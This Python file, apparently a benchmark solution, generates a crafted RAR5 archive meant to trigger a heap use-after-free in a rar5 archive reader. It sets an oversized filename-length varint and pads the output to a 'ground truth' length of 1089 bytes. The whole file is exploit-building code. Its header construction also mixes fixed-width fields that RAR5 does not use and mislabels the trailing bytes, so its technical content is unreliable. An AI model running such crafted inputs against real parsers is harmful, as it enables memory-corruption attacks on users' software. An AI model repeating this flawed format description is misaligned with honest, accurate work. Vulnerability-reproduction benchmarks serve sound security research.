import os
import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # RAR5 constants
        RAR5_SIGNATURE = b'Rar!\x1A\x07\x01\x00'
        HEADER_TYPE_FILE = 0x01
        HEADER_FLAG_HAS_EXTRA = 0x0001
        HEADER_FLAG_HAS_DATA = 0x0002
        HEADER_FLAG_SKIP_IF_UNKNOWN = 0x0004
        
        # Create a malicious RAR5 archive with oversized filename
        # This triggers the heap use-after-free in rar5 reader
        
        # 1. Archive header
        data = bytearray()
        data.extend(RAR5_SIGNATURE)
        
        # 2. File header with oversized filename
        # Calculate header size: 9 bytes common header + variable fields
        # We'll make filename size very large (0xFFFFFFF)
        
        # File header structure:
        # - CRC32 (4 bytes) - we'll calculate later
        # - Header size (2 bytes, little endian)
        # - Header type (1 byte)
        # - Header flags (2 bytes, little endian)
        # - Extra size (2 bytes, little endian) if HAS_EXTRA flag set
        # - File-specific fields
        #   - Compressed size (varint)
        #   - Uncompressed size (varint)
        #   - Operating system (1 byte)
        #   - File CRC32 (4 bytes)
        #   - Modification time (4 bytes)
        #   - Compression info (varint)
        #   - Host OS (1 byte)
        #   - Filename length (varint)
        #   - Filename (variable)
        
        # Build file-specific fields first
        file_fields = bytearray()
        
        # Compressed size = 0 (varint)
        file_fields.append(0x00)
        
        # Uncompressed size = 0 (varint)
        file_fields.append(0x00)
        
        # OS = Windows (0)
        file_fields.append(0x00)
        
        # File CRC32 = 0
        file_fields.extend(b'\x00\x00\x00\x00')
        
        # Modification time = 0
        file_fields.extend(b'\x00\x00\x00\x00')
        
        # Compression info = 0 (varint)
        file_fields.append(0x00)
        
        # Host OS = Windows (0)
        file_fields.append(0x00)
        
        # Filename length - use a very large value (0xFFFFFFF)
        # Encode as varint: 0xFF 0xFF 0xFF 0xFF 0x0F
        filename_length_bytes = b'\xFF\xFF\xFF\xFF\x0F'
        file_fields.extend(filename_length_bytes)
        
        # Filename - minimal actual data to trigger allocation
        # The reader will allocate based on filename_length but only read this small amount
        filename = b"test.txt"
        file_fields.extend(filename)
        
        # Now build the complete header
        header = bytearray()
        
        # Header type and flags
        header_type = HEADER_TYPE_FILE
        header_flags = HEADER_FLAG_HAS_DATA
        
        # Calculate total header size
        # Common header: 9 bytes (CRC32 + size + type + flags)
        # File fields: len(file_fields)
        header_size = 9 + len(file_fields)
        
        # Add placeholder for CRC32 (will calculate later)
        header.extend(b'\x00\x00\x00\x00')
        
        # Header size (little endian)
        header.extend(struct.pack('<H', header_size))
        
        # Header type
        header.append(header_type)
        
        # Header flags (little endian)
        header.extend(struct.pack('<H', header_flags))
        
        # Add file fields
        header.extend(file_fields)
        
        # Calculate CRC32 of the header (excluding the first 4 bytes)
        crc = zlib.crc32(header[4:]) & 0xFFFFFFFF
        struct.pack_into('<I', header, 0, crc)
        
        # Combine everything
        data.extend(header)
        
        # Add minimal file data (required by HAS_DATA flag)
        # Smallest possible: just the end marker
        data.extend(b'\x00\x00\x00\x00')  # CRC32 of data (0)
        data.extend(b'\x03\x00')  # Data size (3)
        data.extend(b'\x03')  # Header type (3 = end of archive)
        data.extend(b'\x00\x00')  # Flags (0)
        
        # Ensure exact length (1089 bytes as per ground truth)
        target_length = 1089
        if len(data) < target_length:
            # Pad with null bytes
            data.extend(b'\x00' * (target_length - len(data)))
        elif len(data) > target_length:
            # Truncate (shouldn't happen with our construction)
            data = data[:target_length]
        
        return bytes(data)
